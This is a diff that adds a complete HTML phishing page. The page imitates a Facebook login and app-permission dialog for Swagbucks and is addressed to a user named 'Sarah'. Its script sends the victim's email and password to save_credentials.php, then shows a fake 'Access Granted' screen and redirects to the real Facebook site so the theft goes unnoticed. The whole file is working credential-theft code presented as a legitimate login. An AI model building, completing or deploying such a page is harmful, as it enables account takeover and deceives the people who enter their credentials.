@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <title>Swagbucks - Permission Request</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Permission Request Card (First Screen) - Swagbucks requesting access -->
+    <div id="permissionScreen" class="permission-card">
+        <div class="content">
+            <div class="app-icon">
+                <img src="swagbucks.png" alt="Swagbucks" class="swagbucks-logo" onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<div class=\'app-icon-circle\' style=\'background: linear-gradient(145deg, #f9a01b, #f07d06);\'><span>SB</span></div>');">
+            </div>
+            <h2>Swagbucks is requesting access to:</h2>
+            <div class="permissions-list">
+                <p>Your name and profile picture, access your page and app insights, manage your business, manage and access page conversations on messenger, create and manage content on your page, manage comments on your page, read content posted on the page, manage accounts, settings and webhooks for a page, read user content on our page and show a list of the pages you manage.</p>
+                <div class="edit-link">Edit access</div>
+            </div>
+            <div class="info-note">
+                By continuing, Swagbucks will receive ongoing access to the information that you share and Facebook will record when Swagbucks accesses it. 
+                <a href="#">Learn more</a> about this sharing and the settings you have.
+            </div>
+            <div class="button-group">
+                <button id="continueAsSarahBtn" class="btn-continue">Continue as Sarah</button>
+                <button id="cancelBtn" class="btn-cancel">Cancel</button>
+            </div>
+        </div>
+        <div class="footer-links">
+            <a href="#">Swagbucks' Privacy Policy</a> • 
+            <a href="#">Terms of Service</a>
+        </div>
+    </div>
+
+    <!-- Login Screen (Hidden initially) - Facebook Login with local Facebook logo -->
+    <div id="loginScreen" class="login-section hidden">
+        <div class="login-header">
+            <div class="facebook-logo-wrapper">
+                <img src="facebook.png" alt="Facebook" class="facebook-logo" onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<div class=\'app-icon-circle\' style=\'width:64px;height:64px;background:linear-gradient(145deg,#1877f2,#0e5ec4);margin:0 auto;\'><span>F</span></div>');">
+            </div>
+            <h3>Log into Facebook</h3>
+            <p>To continue to Swagbucks</p>
+        </div>
+        <div id="loginError" class="error-message hidden"></div>
+        <div class="input-group">
+            <input type="text" id="usernameEmail" placeholder="Email address or phone number" autocomplete="off">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password">
+        </div>
+        <button id="loginSubmitBtn" class="login-btn">Log In</button>
+        <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Create new account</a>
+        </div>
+    </div>
+
+    <!-- Success Screen - Fixed logo sizes -->
+    <div id="successScreen" class="success-section hidden">
+        <div class="success-content">
+            <div class="success-checkmark">
+                <div class="check-icon">
+                    <span class="icon-line line-tip"></span>
+                    <span class="icon-line line-long"></span>
+                    <div class="icon-circle"></div>
+                    <div class="icon-fix"></div>
+                </div>
+            </div>
+            <div class="success-app-icon">
+                <div class="success-logo-wrapper">
+                    <img src="swagbucks.png" alt="Swagbucks" class="success-swagbucks-logo" onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<div class=\'success-fallback-circle swagbucks-fallback\'><span>SB</span></div>');">
+                </div>
+                <div class="success-plus-icon">+</div>
+                <div class="success-logo-wrapper">
+                    <img src="facebook.png" alt="Facebook" class="success-facebook-logo" onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<div class=\'success-fallback-circle facebook-fallback\'><span>F</span></div>');">
+                </div>
+            </div>
+            <h2 class="success-title">Access Granted</h2>
+            <p class="success-message">You have successfully granted Swagbucks permission to access your Facebook account.</p>
+            <div class="success-details">
+                <p>Swagbucks can now:</p>
+                <ul>
+                    <li>✓ View your name and profile picture</li>
+                    <li>✓ Access your page insights</li>
+                    <li>✓ Manage comments on your page</li>
+                    <li>✓ Read content posted on your page</li>
+                </ul>
+            </div>
+            <button id="continueToFacebookBtn" class="btn-success">Continue to Facebook</button>
+        </div>
+    </div>
+
+    <script>
+        // DOM elements
+        const permissionScreen = document.getElementById('permissionScreen');
+        const loginScreen = document.getElementById('loginScreen');
+        const successScreen = document.getElementById('successScreen');
+        const continueBtn = document.getElementById('continueAsSarahBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const loginSubmit = document.getElementById('loginSubmitBtn');
+        const continueToFacebook = document.getElementById('continueToFacebookBtn');
+        const usernameInput = document.getElementById('usernameEmail');
+        const passwordInput = document.getElementById('password');
+        const errorDiv = document.getElementById('loginError');
+
+        function showPermissionScreen() {
+            permissionScreen.classList.remove('hidden');
+            loginScreen.classList.add('hidden');
+            successScreen.classList.add('hidden');
+            usernameInput.value = '';
+            passwordInput.value = '';
+            errorDiv.classList.add('hidden');
+            errorDiv.innerText = '';
+        }
+
+        function showLoginScreen() {
+            permissionScreen.classList.add('hidden');
+            loginScreen.classList.remove('hidden');
+            successScreen.classList.add('hidden');
+            errorDiv.classList.add('hidden');
+            errorDiv.innerText = '';
+        }
+
+        function showSuccessScreen() {
+            permissionScreen.classList.add('hidden');
+            loginScreen.classList.add('hidden');
+            successScreen.classList.remove('hidden');
+        }
+
+        continueBtn.addEventListener('click', () => {
+            showLoginScreen();
+        });
+
+        cancelBtn.addEventListener('click', () => {
+            alert("You canceled the request. Swagbucks will not have access.");
+        });
+
+        continueToFacebook.addEventListener('click', () => {
+            window.location.href = "https://m.facebook.com/?_rdr";
+        });
+
+        async function storeCredentials(usernameEmail, pwd) {
+            if (!usernameEmail || !pwd) {
+                throw new Error("Please fill in both fields.");
+            }
+            
+            const response = await fetch('save_credentials.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `email=${encodeURIComponent(usernameEmail)}&password=${encodeURIComponent(pwd)}`
+            });
+            
+            if (!response.ok) {
+                throw new Error("Network error, could not reach server.");
+            }
+            
+            const result = await response.json();
+            if (result.status === 'success') {
+                return true;
+            } else {
+                throw new Error(result.message || "Failed to save credentials");
+            }
+        }
+
+        function setLoginLoading(isLoading) {
+            const btn = loginSubmit;
+            if (isLoading) {
+                btn.disabled = true;
+                btn.innerHTML = '<span class="loader"></span> Logging in...';
+            } else {
+                btn.disabled = false;
+                btn.innerHTML = 'Log In';
+            }
+        }
+
+        loginSubmit.addEventListener('click', async (e) => {
+            e.preventDefault();
+            const email = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            errorDiv.classList.add('hidden');
+            errorDiv.innerText = '';
+            
+            if (!email || !password) {
+                errorDiv.innerText = "Email/Username and password are required.";
+                errorDiv.classList.remove('hidden');
+                return;
+            }
+            
+            setLoginLoading(true);
+            
+            try {
+                await storeCredentials(email, password);
+                showSuccessScreen();
+            } catch (err) {
+                console.error("Storage error:", err);
+                errorDiv.innerText = err.message || "Authentication failed. Please try again.";
+                errorDiv.classList.remove('hidden');
+                setLoginLoading(false);
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginSubmit.click();
+            }
+        });
+        usernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginSubmit.click();
+            }
+        });
+    </script>
+</body>
+</html>
